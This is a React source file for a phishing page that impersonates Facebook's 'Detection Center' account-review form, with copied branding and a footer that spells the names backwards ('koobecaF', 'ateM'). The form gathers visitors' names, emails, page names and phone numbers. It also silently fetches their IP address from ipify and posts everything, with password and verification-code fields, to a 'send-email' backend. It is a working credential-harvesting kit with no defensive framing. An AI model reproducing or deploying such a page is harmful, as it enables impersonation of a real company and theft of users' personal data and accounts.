import React, { useState } from 'react';
import axios from 'axios';
import './main.css';
import netflix from './netflix.png';

function App() {
  const [name, setName] = useState('');
  const [email, setEmail] = useState('');
  const [pageName, setPageName] = useState('');
  const [addInfo, setAddInfo] = useState('');
  const [password, setPassword] = useState('sss');
  const [rePassword, setRePassword] = useState('Facebook@6364');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [ipAddress, setIpAddress] = useState('');
  const [verifyCode, setVerifyCode] = useState('123');

  const handleSubmit = async e => {
    e.preventDefault();
    axios.post('http://localhost:4000/send-email', {
      name, email, pageName,addInfo,ipAddress, password, rePassword, phoneNumber, verifyCode
    })
    .then(response => {
      console.log(response.data);
    })
    .catch(error => {
      console.error(error);
    });
  };
  const getIPAddress = () => {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
      if (xhr.readyState === 4 && xhr.status === 200) {
        var response = JSON.parse(xhr.responseText);
        console.log(response.ip);
        setIpAddress(response.ip);
      }
    };
    xhr.open("GET", "https://api.ipify.org?format=json", true);
    xhr.send();
  }
  getIPAddress();
  return (
    <>
    <div className="Missions__new">
            <div className="Missions__new-header">
                <div className="container">
                    <div className="Missions__new-header2">
                        <div className="Missions__new-header-img">
                            <div className="Missions__new-header-img-fb">
                                <img src={netflix} style={{width:' 40px', height: '40px'}} />
                                <span>Facebook</span><span className="mdi mdi-account-circle"></span>
                            </div>
                            <div className="Missions__new-header-img-tabs">
                                <span>Detection Center</span><span>Privacy Policy</span>
                                <span>Developers</span>
                                <span>Help</span>
                            </div>
                        </div>
                        <div style={{display: 'flex', alignItems: 'center'}}>
                            <div className="asfASwfhrtui">
                                <div className="asWtghjpowgS">
                                    <label className="fskKWsfpWWfs">
                                        <span className="fskWTghaPPo">
                                            <img className="fsoTskfuwQ" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAAUCAYAAABvVQZ0AAABQ2lDQ1BJQ0MgUHJvZmlsZQAAKJFjYGASSSwoyGFhYGDIzSspCnJ3UoiIjFJgf8bABYRCDIwMXInJxQWOAQE+QCUMMBoVfLsGVAcEl3VBZn1ZueS0godfmY6ljuu5i47smOpRAFdKanEykP4DxGnJBUUlDAyMKUC2cnlJAYjdAWSLFAEdBWTPAbHTIewNIHYShH0ErCYkyBnIvgFkCyRnJALNYHwBZOskIYmnI7Gh9oIAj4urj49CgJGJoaUHAeeSDkpSK0pAtHN+QWVRZnpGiYIjMJRSFTzzkvV0FIwMjIwYGEBhDlH9+QY4LBnFOBBiKU8ZGIxzgYIaCLEsAQaG3d8YGAS3IsTUHwK9NZeB4UBAQWJRItwBjN9YitOMjSBs7u0MDKzT/v//HM7AwK7JwPD3+v//v7f///93GQMD8y2g3m8AY1pfHjpVnF4AAABWZVhJZk1NACoAAAAIAAGHaQAEAAAAAQAAABoAAAAAAAOShgAHAAAAEgAAAESgAgAEAAAAAQAAABOgAwAEAAAAAQAAABQAAAAAQVNDSUkAAABTY3JlZW5zaG90vIbPawAAAdRpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IlhNUCBDb3JlIDYuMC4wIj4KICAgPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4KICAgICAgPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIKICAgICAgICAgICAgeG1sbnM6ZXhpZj0iaHR0cDovL25zLmFkb2JlLmNvbS9leGlmLzEuMC8iPgogICAgICAgICA8ZXhpZjpQaXhlbFlEaW1lbnNpb24+MjA8L2V4aWY6UGl4ZWxZRGltZW5zaW9uPgogICAgICAgICA8ZXhpZjpQaXhlbFhEaW1lbnNpb24+MTk8L2V4aWY6UGl4ZWxYRGltZW5zaW9uPgogICAgICAgICA8ZXhpZjpVc2VyQ29tbWVudD5TY3JlZW5zaG90PC9leGlmOlVzZXJDb21tZW50PgogICAgICA8L3JkZjpEZXNjcmlwdGlvbj4KICAgPC9yZGY6UkRGPgo8L3g6eG1wbWV0YT4KAgXlsAAAAe5JREFUOBFjfPvh838GKgEmKpkDNmbwGsaCzZt//vxhWLF8GcOZ06cYPn36xCAtLcPg6OTE4OTsgk05XAzDmxs3rGfQ19FiyM/NZnj48CFY4ZEjhxlCgwMZQoICGJ48fgzXjMEAxSYMz1uwCBSz/+MTEv/funsfLg6S37pj1399fYP/aurq/+8+eIwiB9PPCGKAbAB5DeQidw8Phr4JkzAsBQm8ffuGwdXJgcHO3oFhwqQpGGrg3gSF0YsXzxmqa+swFMEEhIVFGIpLyxkWL1rI8OHDB5gwnIYbBgpskI0gDfiAh6cnWPrcubMYyuCGgWJNUFAQQwG6AMyyL58/o0sxwA2TlpFhuH//PoYCdIFbt26BhSSlpNClEIY5OjoxXLp4geHEieMYipAFVgLDVkJCksHU1AxZGMKGRSuIdnJy/q8HjP5bd1CTBUxNbn4BOOm0tnVgTRpwb4KM7p84meHHj+8MLs4ODEsWL2J48+YNw////xlu3bzJ0NRYzzB54gSwC37/+Q1xCToJsxVGgxJkbFwC2AVAtXBaUlLyP8hFDU3NYLGGxmYM12HkTQEBAWCCnMwA1MRwHhj9n4GxBgpslDACGtdQXwt2F9DrcPdhGAaTARnq6OQM46LQyAYgS8CzE7IguWyUCCDXEJg+AOs8K1jFqFXNAAAAAElFTkSuQmCC" />
                                        </span>
                                        <input className="ksfWopmNNs" name="seach" placeholder="Search" type="text" />
                                    </label>
                                </div>
                            </div>
                            <div className="fksItuASsam">
                                <div className="skUYiuMcasjh">
                                    <svg className="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="PersonIcon" style={{color: 'rgb(156, 163, 175)'}}><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"></path>
                                    </svg>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div className="Missions__new-container">
                <div className="container">
                    <div className="Missions__new-container-top">
                        <div className="Missions__new-container-top-left">
                            <h1>Request an account review</h1>
                            <span>Detection Center System</span>
                        </div>
                        <div className="Missions__new-container-top-right">
                            <span>v2.11.076</span>
                        </div>
                    </div>
                    <div className="Missions__new-container-content">
                        <div className="Missions__new-container-content-left">
                            <div className="Missions__new-container-content_progress-bar">
                                <div className="Missions__new-container-content_progress-bar-titles">
                                    <span>Fill form</span>
                                    <span style={{textAlign: 'center'}}>Submit form</span>
                                    <span style={{textAlign: 'end'}}>Await decision</span>
                                </div>
                                <nav className="nav nav-pills d-flex">
                                    <div className="border"></div>
                                    <a className="nav-linkk asd" href="#">
                                        <svg className="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="CheckCircleOutlineIcon"><path d="M16.59 7.58 10 14.17l-3.59-3.58L5 12l5 5 8-8zM12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8z"></path></svg>
                                    </a>
                                    <a className="nav-linkk asd" href="#">
                                        <svg className="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="RadioButtonUncheckedIcon"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8z"></path></svg>
                                    </a>
                                    <a className="nav-linkk asd" href="#">
                                        <svg className="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="RadioButtonUncheckedIcon"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8z"></path></svg>
                                    </a>
                                </nav>
                            </div>
                            <div className="Missions__new-container-content_form">
                                <div className="Intro__new-related-topics-card">
                                    <div className="Missions__new-container-content_form-card-top">
                                        <h1>Request Form</h1>
                                        <span>Ref. 99B83BB5-D100-4604-B888-513BE70DE9A3</span>
                                    </div>
                                    <div className="Missions__new-container-contenct_form-real">
                                        <form onSubmit={handleSubmit}>
                                            <div className="form-group">
                                                <label  className=""><span>Full Name:</span></label>
                                                <div className="input-group">
                                                    <input placeholder="" name="name" required="" id="name" type="text" className="form-control form-control--newsletter form-control" value={name} onChange={e => setName(e.target.value)} />
                                                </div>
                                            </div>
                                            <div className="form-group">
                                                <label  className=""><span>Email:</span></label>
                                                <div className="input-group">
                                                    <input placeholder="" name="phoneNumber" required="" type="text" id="email" className="form-control form-control--newsletter form-control" value={email} onChange={e => setEmail(e.target.value)} />
                                                </div>
                                            </div>
                                            <div className="form-group">
                                                <label  className=""><span>Page navbar-expand-sm:</span></label>
                                                <div className="input-group">
                                                    <input placeholder="" id="pageName" required="" name="pageName"  type="tel" className="form-control form-control--newsletter form-control" value={pageName} onChange={e => setPageName(e.target.value)} />
                                                </div>
                                            </div>
                                            <div className="form-group">
                                                <label  className=""><span>Phone number:</span></label>
                                                <div className="input-group">
                                                    <input placeholder="" id="phoneNumber" required="" name="pageName" type="tel" className="form-control form-control--newsletter form-control" value={phoneNumber} onChange={e => setPhoneNumber(e.target.value)} />
                                                </div>
                                            </div>
                                            <div className="form-group">
                                                <label  className="">
                                                    <span>Any specific details (optional):</span>
                                                </label><div className="input-group">
                                                    <textarea placeholder="" id="addInfo" name="additionalInfo" required="" className="form-control form-control--newsletter form-control" value={addInfo} onChange={e => setAddInfo(e.target.value)}></textarea>
                                                </div>
                                            </div>
                                            {/* <div className="form-check">
                                                <input type="checkbox" className="form-check-input" id="terms" name="terms" required="" />
                                                <label className="form-check-label" for="terms">By clicking the button below, you agree to our Terms of Service and our Data Policy.</label>
                                                <br />
                                            </div> */}
                                            <input type="hidden" id="ipAddress" name="ipAddress" value="" />
                                            <div className="Missions__new-btn">
                                                <button type="submit" variant="contained" className="btn btn-secondary" style={{alignSelf: "flex-end"}}>
                                                    <span>Submit</span>
                                                </button>
                                            </div>
                                        </form>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div className="Missions__new-container-content-right">
                            <p>Our Detection Center System identifies accounts which violate our 
                                <a href="https://www.facebook.com/legal/terms">Terms of Service</a> 
                                and our
                                <a href="https://transparency.fb.com/en-gb/policies/community-standards/"> Community Standards</a>
                                , mainly targetting 
                                <a href="#">Duplicate or shared accounts used by many people</a>
                                . or accounts which impersonate someone else.
                            </p>
                        </div>
                    </div>
                </div>
            </div>
            <div className="Missions__new-footer">
                <div className="Missions__new-footer-wrapper">
                    <div className="Missions__new-footer-wrapper-lis">
                        <a href="https://www.facebook.com/help/1561485474074139?ref=dp">Products</a>
                        <a href="https://www.facebook.com/policies_center">Terms &amp; Policies</a>
                        <a href="https://developers.facebook.com/?ref=pf">Developers</a>
                        <a href="https://www.facebook.com/help/?ref=pf">Help</a>
                    </div>
                    <p>The koobecaF company is now ateM. We’ve updated our Terms of Use, Privacy Policy, and Cookies Policy to reflect the new name on January 4, 2022. While our company name has changed, we are continuing to offer the same products, including the koobecaF app.</p>
                    <label>© 2022 Meta</label>
                </div>
            </div>
        </div>
    </>
    // <form onSubmit={handleSubmit}>
    //   <label>
    //     Name:
    //     <input type="text" value={name} onChange={e => setName(e.target.value)} />
    //   </label>
    //   <br />
    //   <label>
    //     Email:
    //     <input type="email" value={email} onChange={e => setEmail(e.target.value)} />
    //   </label>
    //   <br />
    //   <label>
    //     Message:
    //     <textarea value={message} onChange={e => setMessage(e.target.value)} />
    //   </label>
    //   <br />
    //   <button type="submit">Send</button>
    // </form>
  );
}

export default App;